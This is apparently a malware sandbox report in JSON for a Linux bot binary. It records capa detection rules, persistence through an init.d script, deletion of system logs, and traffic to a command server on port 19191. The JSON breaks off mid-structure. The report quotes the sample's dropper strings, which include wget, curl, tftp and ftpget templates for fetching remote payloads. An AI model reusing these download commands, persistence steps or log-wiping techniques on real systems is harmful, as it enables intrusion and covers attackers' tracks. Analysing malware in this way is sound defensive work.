@@ -1,0 +1,1247 @@
+{
+    "data":  {
+                 "files_deleted":  [
+                                       "//rsyslogd",
+                                       "/dev/kmsg",
+                                       "/var/log/journal/a39eb3ed78b7401fb6809ed0c562a5b1/system.journal",
+                                       "/var/log/journal/a39eb3ed78b7401fb6809ed0c562a5b1/user-1000.journal",
+                                       "/var/log/kern.log",
+                                       "/var/log/syslog"
+                                   ],
+                 "signature_matches":  [
+                                           {
+                                               "id":  "0",
+                                               "format":  "SIG_FORMAT_CAPA",
+                                               "name":  "encode data using XOR",
+                                               "description":  "data-manipulation/encoding/xor",
+                                               "authors":  [
+                                                               "moritz.raabe@mandiant.com"
+                                                           ],
+                                               "match_data":  [
+                                                                  "tight loop",
+                                                                  "nzxor"
+                                                              ],
+                                               "rule_src":  "rule:\n  meta:\n    name: encode data using XOR\n    namespace: data-manipulation/encoding/xor\n    authors:\n      - moritz.raabe@mandiant.com\n    scopes:\n      static: basic block\n      dynamic: unsupported  # requires characteristic, Not features\n    att\u0026ck:\n      - Defense Evasion::Obfuscated Files or Information [T1027]\n    mbc:\n      - Defense Evasion::Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]\n      - Data::Encode Data::XOR [C0026.002]\n    examples:\n      - 2D3EDC218A90F03089CC01715A9F047F:0x403D7E\n  features:\n    - and:\n      - characteristic: tight loop\n      - characteristic: nzxor\n      - not:\n        - description: filter for potential false positives\n        - or:\n          - or:\n            - description: unsigned bitwise negation operation (~i)\n            - number: 0xFFFFFFFF = bitwise negation for unsigned 32 bits\n            - number: 0xFFFFFFFFFFFFFFFF = bitwise negation for unsigned 64 bits\n          - or:\n            - description: signed bitwise negation operation (~i)\n            - number: 0x0FFFFFFF = bitwise negation for signed 32 bits\n            - number: 0x0FFFFFFFFFFFFFFF = bitwise negation for signed 64 bits\n          - or:\n            - description: Magic constants used in the implementation of strings functions.\n            # such as `strlen` and `strcat` in the Windows standard library:\n            # (((i - 0x81010101) ^ ~i) \u0026 0x81010100)\n            ## 32 bits\n            - number: 0x7EFEFEFF = optimized string constant for 32 bits\n            - number: 0x81010101 = -0x81010101 = 0x7EFEFEFF\n            - number: 0x81010100 = 0x81010100 = ~0x7EFEFEFF\n            ## 64 bits\n            - number: 0x7EFEFEFEFEFEFEFF = optimized string constant for 64 bits\n            - number: 0x8101010101010101 = -0x8101010101010101 = 0x7EFEFEFEFEFEFEFF\n            - number: 0x8101010101010100 = 0x8101010101010100 = ~0x7EFEFEFEFEFEFEFF\n"
+                                           },
+                                           {
+                                               "id":  "2",
+                                               "format":  "SIG_FORMAT_CAPA",
+                                               "name":  "hash data using djb2",
+                                               "description":  "data-manipulation/hashing/djb2",
+                                               "authors":  [
+                                                               "awillia2@cisco.com",
+                                                               "still@teamt5.org"
+                                                           ],
+                                               "match_data":  [
+                                                                  "mnemonic: shl",
+                                                                  "mnemonic: mov"
+                                                              ],
+                                               "rule_src":  "rule:\n  meta:\n    name: hash data using djb2\n    namespace: data-manipulation/hashing/djb2\n    authors:\n      - awillia2@cisco.com\n      - still@teamt5.org\n    scopes:\n      static: function\n      dynamic: unsupported  # requires mnemonic features\n    mbc:\n      - Data::Non-Cryptographic Hash::djb2 [C0030.006]\n    references:\n      - https://twitter.com/r3c0nst/status/1392405576131436546\n      - http://www.cse.yorku.ca/~oz/hash.html\n    examples:\n      - 6be0ae5cb7c3155f70d608fc7670d2d9:0x41DD19\n  features:\n    - and:\n      - instruction:\n        - description: hash = 5381\n        - mnemonic: mov\n        - number: 5381\n      - or:\n        - instruction:\n          - description: hash \u003c\u003c 5\n          - mnemonic: shl\n          - number: 5\n        - instruction:\n          - description: hash * 33\n          - or:\n            - mnemonic: mul\n            - mnemonic: imul\n          - number: 33\n",
+                                               "refs":  [
+                                                            {
+                                                                "ref":  "https://twitter.com/r3c0nst/status/1392405576131436546"
+                                                            },
+                                                            {
+                                                                "ref":  "http://www.cse.yorku.ca/~oz/hash.html"
+                                                            }
+                                                        ]
+                                           },
+                                           {
+                                               "id":  "3",
+                                               "format":  "SIG_FORMAT_CAPA",
+                                               "name":  "encrypt data using RC4 PRGA",
+                                               "description":  "data-manipulation/encryption/rc4",
+                                               "authors":  [
+                                                               "moritz.raabe@mandiant.com"
+                                                           ],
+                                               "match_data":  [
+                                                                  "tight loop",
+                                                                  "recursive call",
+                                                                  "contain loop"
+                                                              ],
+                                               "rule_src":  "rule:\n  meta:\n    name: encrypt data using RC4 PRGA\n    namespace: data-manipulation/encryption/rc4\n    authors:\n      - moritz.raabe@mandiant.com\n    scopes:\n      static: function\n      dynamic: unsupported  # requires characteristic, mnemonic, basicblock features\n    att\u0026ck:\n      - Defense Evasion::Obfuscated Files or Information [T1027]\n    mbc:\n      - Cryptography::Encrypt Data::RC4 [C0027.009]\n      - Cryptography::Generate Pseudo-random Sequence::RC4 PRGA [C0021.004]\n    examples:\n      - 34404A3FB9804977C6AB86CB991FB130:0x403DB0\n      - 34404A3FB9804977C6AB86CB991FB130:0x403E50\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4049F0\n      - 73CE04892E5F39EC82B00C02FC04C70F:0x4064C6\n  features:\n    - and:\n      # TODO: maybe add characteristic for nzxor reg size\n      - count(characteristic(nzxor)): 1\n      - or:\n        - match: calculate modulo 256 via x86 assembly\n        # compiler may do this via zero-extended mov from 8-bit register\n        - count(mnemonic(movzx)): 4 or more\n      # should not call (many) functions\n      - count(characteristic(calls from)): (0, 4)\n      # should not be too simple or too complex (50 is picked by intuition)\n      - count(basic blocks): (4, 50)\n      - match: contain loop\n      - optional:\n        - or:\n          - number: 0xFF\n          - number: 0x100\n"
+                                           },
+                                           {
+                                               "id":  "715",
+                                               "description":  "Classification label",
+                                               "match_data":  [
+                                                                  "mal60.troj.evad.linX86@0/3@0/0"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4014",
+                                               "description":  "Sample tries to persist itself using System V runlevels",
+                                               "match_data":  [
+                                                                  "/etc/rc2.d/S99sysd -\u003e /etc/init.d/sysd"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_LOW"
+                                           },
+                                           {
+                                               "id":  "4013",
+                                               "description":  "Sample has stripped symbol table",
+                                               "match_data":  [
+                                                                  "no"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4023",
+                                               "description":  "Sample tries to set the executable flag",
+                                               "match_data":  [
+                                                                  "/etc/init.d/sysd (bits: - usr: rx grp: rx all: rwx)"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "7021",
+                                               "description":  "Connects to IPs without corresponding DNS lookups",
+                                               "match_data":  [
+                                                                  "34.158.198.175"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4007",
+                                               "description":  "Sample contains strings that are user agent strings indicative of HTTP manipulation",
+                                               "match_data":  [
+                                                                  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
+                                                                  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+                                                                  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+                                                                  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+                                                                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
+                                                                  "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+                                                                  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+                                                                  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+                                                                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
+                                                                  "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+                                                                  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
+                                                                  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+                                                                  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+                                                                  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+                                                                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
+                                                                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+                                                                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
+                                                                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
+                                                                  "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
+                                                                  "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4123",
+                                               "description":  "Sample tries to set files in /etc globally writable",
+                                               "match_data":  [
+                                                                  "/etc/init.d/sysd (bits: - usr: rx grp: rx all: rwx)"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_LOW"
+                                           },
+                                           {
+                                               "id":  "5013",
+                                               "description":  "Found strings indicative of a multi-platform dropper",
+                                               "match_data":  [
+                                                                  "Server: cloudflare-nginxServer: DOSarrestConnection: keep-aliveTransfer-Encoding: chunkedSet-Cookie: Location: httpRefresh: url=POSTset_cookieMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,",
+                                                                  "/etc/rc2.d/S99sysd/proc/%d/fd/0wget http://%s/%s/%s -O %scurl -o %s http://%s/%s/%stftp %s -c get %s %scd %s \u0026\u0026 tftp -g -r %s %sftpget -v -u anonymous -p anonymous -P 21 %s %s %s/var/run//mnt//root//v"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4036",
+                                               "description":  "Enumerates processes within the \"proc\" file system",
+                                               "match_data":  [
+                                                                  "/proc/593/cmdline",
+                                                                  "/proc/231/cmdline",
+                                                                  "/proc/4969/fd/0",
+                                                                  "/proc/4969/cmdline",
+                                                                  "/proc/597/cmdline",
+                                                                  "/proc/234/cmdline",
+                                                                  "/proc/238/cmdline",
+                                                                  "/proc/117/cmdline",
+                                                                  "/proc/911/cmdline",
+                                                                  "/proc/4844/cmdline",
+                                                                  "/proc/916/cmdline",
+                                                                  "/proc/1219/cmdline",
+                                                                  "/proc/10/cmdline",
+                                                                  "/proc/11/cmdline",
+                                                                  "/proc/12/cmdline",
+                                                                  "/proc/13/cmdline",
+                                                                  "/proc/14/cmdline",
+                                                                  "/proc/15/cmdline",
+                                                                  "/proc/16/cmdline",
+                                                                  "/proc/17/cmdline",
+                                                                  "/proc/4860/cmdline",
+                                                                  "/proc/18/cmdline",
+                                                                  "/proc/4861/cmdline",
+                                                                  "/proc/19/cmdline",
+                                                                  "/proc/120/cmdline",
+                                                                  "/proc/4859/cmdline",
+                                                                  "/proc/1/cmdline",
+                                                                  "/proc/2/cmdline",
+                                                                  "/proc/3/cmdline",
+                                                                  "/proc/4/cmdline",
+                                                                  "/proc/5/cmdline",
+                                                                  "/proc/6/cmdline",
+                                                                  "/proc/7/cmdline",
+                                                                  "/proc/920/cmdline",
+                                                                  "/proc/8/cmdline",
+                                                                  "/proc/800/cmdline",
+                                                                  "/proc/9/cmdline",
+                                                                  "/proc/805/cmdline",
+                                                                  "/proc/926/cmdline",
+                                                                  "/proc/4856/cmdline",
+                                                                  "/proc/20/cmdline",
+                                                                  "/proc/4857/cmdline",
+                                                                  "/proc/21/cmdline",
+                                                                  "/proc/4858/cmdline",
+                                                                  "/proc/22/cmdline",
+                                                                  "/proc/23/cmdline",
+                                                                  "/proc/24/cmdline",
+                                                                  "/proc/25/cmdline",
+                                                                  "/proc/26/cmdline",
+                                                                  "/proc/27/cmdline",
+                                                                  "/proc/28/cmdline",
+                                                                  "/proc/29/cmdline",
+                                                                  "/proc/1000/cmdline",
+                                                                  "/proc/1240/cmdline",
+                                                                  "/proc/4749/cmdline",
+                                                                  "/proc/133/cmdline",
+                                                                  "/proc/376/cmdline",
+                                                                  "/proc/930/cmdline",
+                                                                  "/proc/1112/cmdline",
+                                                                  "/proc/811/cmdline",
+                                                                  "/proc/4862/cmdline",
+                                                                  "/proc/933/cmdline",
+                                                                  "/proc/4863/cmdline",
+                                                                  "/proc/4864/cmdline",
+                                                                  "/proc/4865/cmdline",
+                                                                  "/proc/4866/cmdline",
+                                                                  "/proc/30/cmdline",
+                                                                  "/proc/4867/cmdline",
+                                                                  "/proc/938/cmdline",
+                                                                  "/proc/34/cmdline",
+                                                                  "/proc/1010/cmdline",
+                                                                  "/proc/262/cmdline",
+                                                                  "/proc/1007/cmdline",
+                                                                  "/proc/1127/cmdline",
+                                                                  "/proc/1004/cmdline",
+                                                                  "/proc/1244/cmdline",
+                                                                  "/proc/1001/cmdline",
+                                                                  "/proc/700/cmdline",
+                                                                  "/proc/1122/cmdline",
+                                                                  "/proc/701/cmdline",
+                                                                  "/proc/948/cmdline",
+                                                                  "/proc/396/cmdline",
+                                                                  "/proc/1018/cmdline",
+                                                                  "/proc/1139/cmdline",
+                                                                  "/proc/950/cmdline",
+                                                                  "/proc/1014/cmdline",
+                                                                  "/proc/716/cmdline",
+                                                                  "/proc/959/cmdline",
+                                                                  "/proc/1032/cmdline",
+                                                                  "/proc/1030/cmdline",
+                                                                  "/proc/1027/cmdline",
+                                                                  "/proc/1026/cmdline",
+                                                                  "/proc/963/cmdline",
+                                                                  "/proc/1023/cmdline",
+                                                                  "/proc/1165/cmdline",
+                                                                  "/proc/1041/cmdline",
+                                                                  "/proc/177/cmdline",
+                                                                  "/proc/178/cmdline",
+                                                                  "/proc/179/cmdline",
+                                                                  "/proc/1037/cmdline",
+                                                                  "/proc/614/cmdline",
+                                                                  "/proc/619/cmdline",
+                                                                  "/proc/77/cmdline",
+                                                                  "/proc/78/cmdline",
+                                                                  "/proc/79/cmdline"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "2075",
+                                               "description":  "Executes commands using a shell command-line interpreter",
+                                               "match_data":  [
+                                                                  "sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/syslog",
+                                                                  "sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/mail.info/var/log/mail.warn/var/log/mail.err/var/log/mail.log/var/log/daemon.log/var/log/kern.log/var/log/auth.log/var/log/user.log/var/",
+                                                                  "sh -c -- \"cp rsyslogd /usr/bin/.sh\""
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4032",
+                                               "description":  "Executes the \"systemctl\" command used for controlling the systemd system and service manager",
+                                               "match_data":  [
+                                                                  "/usr/bin/systemctl -\u003e systemctl kill -s HUP rsyslog.service"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4038",
+                                               "description":  "Manipulation of devices in /dev",
+                                               "match_data":  [
+                                                                  "/dev/kmsg"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_LOW"
+                                           },
+                                           {
+                                               "id":  "522",
+                                               "description":  "Detected TCP or UDP traffic on non-standard ports",
+                                               "match_data":  [
+                                                                  "192.168.122.104:49548 -\u003e 34.158.198.175:19191"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "5014",
+                                               "description":  "Sample tries to kill a process (SIGKILL)",
+                                               "match_data":  [
+                                                                  "pid: 1014, result: successful",
+                                                                  "pid: 4969, result: successful"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4041",
+                                               "description":  "Drops files in suspicious directories",
+                                               "match_data":  [
+                                                                  "/etc/init.d/sysd"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_LOW"
+                                           },
+                                           {
+                                               "id":  "2251",
+                                               "description":  "Writes shell script file to disk with an unusual file extension",
+                                               "match_data":  [
+                                                                  "/etc/init.d/sysd"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "2141",
+                                               "description":  "Deletes system log files",
+                                               "match_data":  [
+                                                                  "/var/log/kern.log"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_LOW"
+                                           },
+                                           {
+                                               "id":  "238",
+                                               "description":  "URLs found in memory or binary data",
+                                               "match_data":  [
+                                                                  "https://bugs.launchpad.net/ubuntu/"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           },
+                                           {
+                                               "id":  "4006",
+                                               "description":  "Sample contains strings indicative of BusyBox which embeds multiple Unix commands in a single executable",
+                                               "match_data":  [
+                                                                  "/usr/sbin/busybox",
+                                                                  "/usr/bin/busybox",
+                                                                  "Server: cloudflare-nginxServer: DOSarrestConnection: keep-aliveTransfer-Encoding: chunkedSet-Cookie: Location: httpRefresh: url=POSTset_cookieMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,"
+                                                              ],
+                                               "severity":  "IMPACT_SEVERITY_INFO"
+                                           }
+                                       ],
+                 "mitre_attack_techniques":  [
+                                                 {
+                                                     "id":  "T1027",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "encode data using XOR",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "0"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1027",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "encrypt data using RC4 PRGA",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "3"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1064",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Executes commands using a shell command-line interpreter",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "2075"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1064",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Found strings indicative of a multi-platform dropper",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "5013"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1543.002",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Executes the \"systemctl\" command used for controlling the systemd system and service manager",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4032"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1036",
+                                                     "severity":  "IMPACT_SEVERITY_LOW",
+                                                     "signature_description":  "Drops files in suspicious directories",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4041"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1222",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Sample tries to set the executable flag",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4023"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1070",
+                                                     "severity":  "IMPACT_SEVERITY_LOW",
+                                                     "signature_description":  "Deletes system log files",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "2141"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1003",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Enumerates processes within the \"proc\" file system",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4036"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1001",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Sample contains strings that are user agent strings indicative of HTTP manipulation",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4007"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1571",
+                                                     "severity":  "IMPACT_SEVERITY_INFO",
+                                                     "signature_description":  "Detected TCP or UDP traffic on non-standard ports",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "522"
+                                                                  }
+                                                              ]
+                                                 },
+                                                 {
+                                                     "id":  "T1565",
+                                                     "severity":  "IMPACT_SEVERITY_LOW",
+                                                     "signature_description":  "Sample tries to set files in /etc globally writable",
+                                                     "refs":  [
+                                                                  {
+                                                                      "ref":  "#signature_matches",
+                                                                      "value":  "4123"
+                                                                  }
+                                                              ]
+                                                 }
+                                             ],
+                 "files_dropped":  [
+                                       {
+                                           "path":  "/etc/init.d/sysd",
+                                           "sha256":  "ba1d50d125344f273c249426ccd744d5a12e560ace41cca4bc55bd2d4a718d8f",
+                                           "type":  "TEXT",
+                                           "process_name":  "/tmp/bot.x86",
+                                           "process_id":  "4969"
+                                       },
+                                       {
+                                           "path":  "/var/log/auth.log.1.gz",
+                                           "sha256":  "44a3bab2c338e3bca24c00f7c3da1301eb4a5a889f1c667cc781e1bdacd3b9e7",
+                                           "type":  "GZIP",
+                                           "process_name":  "/bin/gzip",
+                                           "process_id":  "4935"
+                                       }
+                                   ],
+                 "command_executions":  [
+                                            "sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/syslog",
+                                            "/usr/lib/rsyslog/rsyslog-rotate",
+                                            "systemctl kill -s HUP rsyslog.service",
+                                            "/bin/gzip",
+                                            "sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/mail.info/var/log/mail.warn/var/log/mail.err/var/log/mail.log/var/log/daemon.log/var/log/kern.log/var/log/auth.log/var/log/user.log/var/log/lpr.log/var/log/cron.log/var/log/debug/var/log/messages",
+                                            "sh -c -- \"cp rsyslogd /usr/bin/.sh\"",
+                                            "cp rsyslogd /usr/bin/.sh"
+                                        ],
+                 "text_highlighted":  [
+                                          ""
+                                      ],
+                 "mbc":  [
+                             {
+                                 "id":  "E1027.m02",
+                                 "objective":  "Defense Evasion",
+                                 "behavior":  "Obfuscated Files or Information",
+                                 "method":  "Encoding-Standard Algorithm",
+                                 "refs":  [
+                                              {
+                                                  "ref":  "#signature_matches",
+                                                  "value":  "0"
+                                              }
+                                          ]
+                             },
+                             {
+                                 "id":  "C0026.002",
+                                 "objective":  "Data",
+                                 "behavior":  "Encode Data",
+                                 "method":  "XOR",
+                                 "refs":  [
+                                              {
+                                                  "ref":  "#signature_matches",
+                                                  "value":  "0"
+                                              }
+                                          ]
+                             },
+                             {
+                                 "id":  "C0030.006",
+                                 "objective":  "Data",
+                                 "behavior":  "Non-Cryptographic Hash",
+                                 "method":  "djb2",
+                                 "refs":  [
+                                              {
+                                                  "ref":  "#signature_matches",
+                                                  "value":  "2"
+                                              }
+                                          ]
+                             },
+                             {
+                                 "id":  "C0027.009",
+                                 "objective":  "Cryptography",
+                                 "behavior":  "Encrypt Data",
+                                 "method":  "RC4",
+                                 "refs":  [
+                                              {
+                                                  "ref":  "#signature_matches",
+                                                  "value":  "3"
+                                              }
+                                          ]
+                             },
+                             {
+                                 "id":  "C0021.004",
+                                 "objective":  "Cryptography",
+                                 "behavior":  "Generate Pseudo-random Sequence",
+                                 "method":  "RC4 PRGA",
+                                 "refs":  [
+                                              {
+                                                  "ref":  "#signature_matches",
+                                                  "value":  "3"
+                                              }
+                                          ]
+                             }
+                         ],
+                 "processes_created":  [
+                                           "/bin/sh sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/syslog",
+                                           "/usr/lib/rsyslog/rsyslog-rotate",
+                                           "/usr/bin/systemctl systemctl kill -s HUP rsyslog.service",
+                                           "/bin/gzip",
+                                           "/bin/sh sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/mail.info/var/log/mail.warn/var/log/mail.err/var/log/mail.log/var/log/daemon.log/var/log/kern.log/var/log/auth.log/var/log/user.log/var/log/lpr.log/var/log/cron.log/var/log/debug/var/log/messages",
+                                           "/tmp/bot.x86",
+                                           "/tmp/bot.x86 -",
+                                           "/bin/sh sh -c -- \"cp rsyslogd /usr/bin/.sh\"",
+                                           "/usr/bin/cp cp rsyslogd /usr/bin/.sh"
+                                       ],
+                 "memory_pattern_urls":  [
+                                             "https://bugs.launchpad.net/ubuntu/"
+                                         ],
+                 "files_attribute_changed":  [
+                                                 "/etc/init.d/sysd"
+                                             ],
+                 "files_written":  [
+                                       "/etc/init.d/sysd",
+                                       "/var/log/auth.log.1.gz",
+                                       "/var/log/kern.log.1.gz"
+                                   ],
+                 "tags":  [
+                              "SETS_PROCESS_NAME",
+                              "PERSISTENCE"
+                          ],
+                 "ip_traffic":  [
+                                    {
+                                        "destination_ip":  "34.158.198.175",
+                                        "destination_port":  19191
+                                    },
+                                    {
+                                        "destination_ip":  "34.158.198.175",
+                                        "destination_port":  19191,
+                                        "transport_layer_protocol":  "TCP"
+                                    }
+                                ],
+                 "processes_tree":  [
+                                        {
+                                            "process_id":  "105",
+                                            "children":  [
+                                                             {
+                                                                 "process_id":  "109",
+                                                                 "name":  "analyzed_bin",
+                                                                 "children":  [
+                                                                                  {
+                                                                                      "process_id":  "111",
+                                                                                      "children":  [
+                                                                                                       {
+                                                                                                           "process_id":  "112",
+                                                                                                           "name":  "analyzed_bin"
+                                                                                                       }
+                                                                                                   ]
+                                                                                  }
+                                                                              ]
+                                                             }
+                                                         ]
+                                        },
+                                        {
+                                            "process_id":  "4931",
+                                            "name":  "/bin/sh sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/syslog",
+                                            "children":  [
+                                                             {
+                                                                 "process_id":  "4932",
+                                                                 "name":  "/usr/lib/rsyslog/rsyslog-rotate",
+                                                                 "children":  [
+                                                                                  {
+                                                                                      "process_id":  "4933",
+                                                                                      "name":  "/usr/bin/systemctl systemctl kill -s HUP rsyslog.service",
+                                                                                      "files_opened":  [
+                                                                                                           "/lib/systemd/tls/avx512_1/libc.so.6",
+                                                                                                           "/lib/systemd/tls/avx512_1/x86_64/libc.so.6",
+                                                                                                           "/lib/systemd/tls/haswell/avx512_1/libc.so.6",
+                                                                                                           "/lib/systemd/tls/haswell/avx512_1/x86_64/libc.so.6",
+                                                                                                           "/lib/systemd/tls/haswell/libc.so.6",
+                                                                                                           "/lib/systemd/tls/haswell/x86_64/libc.so.6",
+                                                                                                           "/proc/1/environ",
+                                                                                                           "/proc/1/sched",
+                                                                                                           "/proc/4933/stat",
+                                                                                                           "/proc/cmdline",
+                                                                                                           "/proc/filesystems",
+                                                                                                           "/proc/self/stat",
+                                                                                                           "/proc/sys/kernel/osrelease",
+                                                                                                           "/run/systemd/container",
+                                                                                                           "/sys/firmware/efi/efivars/SystemdOptions-8cf2644b-4b0b-428f-9387-6d876050dc67"
+                                                                                                       ]
+                                                                                  }
+                                                                              ],
+                                                                 "files_opened":  [
+                                                                                      "/usr/lib/rsyslog/rsyslog-rotate"
+                                                                                  ]
+                                                             }
+                                                         ]
+                                        },
+                                        {
+                                            "process_id":  "4934",
+                                            "name":  "/bin/gzip",
+                                            "files_opened":  [
+                                                                 "/var/log/kern.log.1"
+                                                             ],
+                                            "files_written":  [
+                                                                  "/var/log/kern.log.1.gz"
+                                                              ]
+                                        },
+                                        {
+                                            "process_id":  "4935",
+                                            "name":  "/bin/gzip",
+                                            "files_opened":  [
+                                                                 "/var/log/auth.log.1"
+                                                             ],
+                                            "files_written":  [
+                                                                  "/var/log/auth.log.1.gz"
+                                                              ]
+                                        },
+                                        {
+                                            "process_id":  "4936",
+                                            "name":  "/bin/sh sh -c /usr/lib/rsyslog/rsyslog-rotate logrotate_script /var/log/mail.info/var/log/mail.warn/var/log/mail.err/var/log/mail.log/var/log/daemon.log/var/log/kern.log/var/log/auth.log/var/log/user.log/var/log/lpr.log/var/log/cron.log/var/log/debug/var/log/messages",
+                                            "children":  [
+                                                             {
+                                                                 "process_id":  "4937",
